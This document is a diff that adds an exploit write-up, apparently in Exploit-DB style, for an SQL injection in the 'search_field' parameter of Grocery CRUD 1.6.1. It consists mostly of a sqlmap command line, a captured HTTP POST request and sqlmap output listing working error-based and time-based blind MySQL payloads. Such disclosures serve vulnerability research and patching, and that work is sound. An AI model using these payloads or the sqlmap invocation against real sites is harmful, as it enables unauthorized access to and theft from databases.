@@ -1,0 +1,47 @@
+# Exploit Title: Grocery crud 1.6.1 - 'search_field' SQL Injection
+# Google Dork: n/a
+# Date: 2018-11-05
+# Exploit Author: Loading Kura Kura  
+# Vendor Homepage: https://www.grocerycrud.com/
+# Software Link: https://www.grocerycrud.com/downloads
+# Version: 1.6.1
+# Tested on: Win10/Kali Linux
+# CVE : 
+
+# 1. Proof of Concept :
+# save request to file, example request.txt
+
+sqlmap -r grocery.txt --level=3 --risk=2 --dbs --dbms=mysql --fresh-queries -p search_field
+
+Request
+========================
+POST /grocerycrud/index.php/examples/customers_management/ajax_list_info HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/grocerycrud/index.php/examples/customers_management
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 91
+Connection: close
+
+search_text=dd&search_field=%5c%27city&per_page=10&order_by%5B0%5D=&order_by%5B1%5D=&page=1
+
+========================
+
+vuln on parameter "search_field"
+================================
+Parameter: search_field (POST)
+    Type: error-based
+    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: search_text=dd&search_field=-7154 OR 1 GROUP BY CONCAT(0x7178707a71,(SELECT (CASE WHEN (3651=3651) THEN 1 ELSE 0 END)),0x716b6a6271,FLOOR(RAND(0)*2)) HAVING MIN(0)#&per_page=10&order_by[0]=&order_by[1]=&page=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: search_text=dd&search_field=(CASE WHEN (2922=2922) THEN SLEEP(5) ELSE 2922 END)&per_page=10&order_by[0]=&order_by[1]=&page=1
+
+================================
+
+bug hunter....
